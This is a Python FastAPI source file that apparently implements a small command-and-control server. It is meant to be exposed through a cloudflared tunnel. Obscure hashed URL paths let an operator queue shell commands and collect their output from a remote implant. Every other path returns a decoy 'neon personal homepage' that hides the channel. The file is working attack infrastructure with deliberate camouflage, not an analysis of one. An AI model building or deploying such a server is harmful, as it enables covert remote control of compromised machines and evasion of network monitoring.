#Dependencies: fastapi & uvicorn
#Step 1: uvicorn main:app --host 127.0.0.1 --port 8000 --log-level info 2>&1 | tee Logs/fastapi_$(date +%Y-%m-%d_%H-%M-%S).log
#Step 2: cloudflared tunnel --url http://localhost:8000
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
#Logging

app = FastAPI()
ascii_art = ''' 
                    ____     ____
                  /'    |   |    \ 
                /    /  |   | \   \ 
              /    / |  |   |  \   \ 
             (   /   |  """"   |\   \   
             | /   / /^\    /^\  \  _|
              ~   | |   |  |   | | ~
                  | |__O|__|O__| |
                /~~      \/     ~~\ 
               /   (      |      )  \ 
               /,   \____/^\___/'   \ 
                / -____-|_|_|-____-\ 
           _____|_/~~~~\____/~~~~\__|_____
          |____|_|     |____|     |__|____|
              | `^-^-^'    `^-^-^'    |
              |                       |    Program Created By:
              |     "Silly Rabbit,    |  github.com/Kaiden-cyber
              |                       |
              |  Root is for admins!" |
              |                       |
              |                       |
              |                       |
              |                       |
               -----------------------'''
print(ascii_art)

current_response = "Nothing new!"
current_command = ""
@app.get("/903695081637dd0202da4c3d5a0800f3", response_class=HTMLResponse)
async def get_msg():
    global current_command
    current_command = ""
    return current_response

@app.get("/2362f23180fa3eab8a92a6269c2c0029", response_class=HTMLResponse)
async def get_msg():
    return current_command

@app.get("/{path:path}", response_class=HTMLResponse)
async def site(path: str, msg: str = "", cmd: str = ""):
    global current_response, current_command
    current_response = msg

    if path.startswith("48ff1e22c70a20512510fea2adf39497/"): #set command outputs
        return f"""
        Request Recieved
        """

    elif path.startswith("86e8fc0c3eb4660fbfdc849a844cd54/"): #set commands
        current_command = cmd
        return f"""
        Request Recieved
        """
    else:
        return f"""
<!DOCTYPE html>
<html lang='en'>
<head>
<meta charset='UTF-8'>
<title>My Neon Homepage</title>
<style>
body{{background:#000;color:#0ff;font-family:Verdana,sans-serif;margin:0;text-align:center;}}
header{{background:linear-gradient(#f0f,#00f);padding:25px;color:#fff;font-size:40px;font-weight:bold;text-shadow:2px 2px 4px #000;}}
.container{{padding:40px;max-width:900px;margin:auto;}}
.section{{margin-top:40px;padding:20px;border:2px solid #0ff;background:#111;box-shadow:0 0 10px #0ff;}}
h2{{color:#ff0;text-shadow:0 0 6px #ff0;}}
p{{color:#0ff;font-size:18px;line-height:1.6;}}
ul{{list-style:none;padding:0;color:#0ff;font-size:18px;}}
footer{{margin-top:40px;padding:20px;background:#111;color:#0ff;font-size:14px;border-top:2px solid #0ff;}}
</style>
</head>
<body>

<header>Welcome to My Homepage</header>

<div class='container'>

<div class='section'>
<h2>About Me</h2>
<p>This is my neon‑themed personal homepage. I like bright colors, retro web design, and making fun little projects that look like they came straight from the early 2000s.</p>
</div>

<div class='section'>
<h2>My Interests</h2>
<ul>
<li>• Art and creative projects</li>
<li>• Retro websites and glowing aesthetics</li>
<li>• Music, games, and anything colorful</li>
<li>• School projects with personality</li>
</ul>
</div>

<div class='section'>
<h2>Current Projects</h2>
<p>I'm working on a few things right now — some art, some school assignments, and this website. More updates will show up here once I finish tweaking the colors.</p>
</div>

<div class='section'>
<h2>Contact</h2>
<p>You can usually find me online or working on something creative.</p>
</div>

</div>

<footer>© 2026 My Neon Homepage</footer>

</body>
</html>
"""




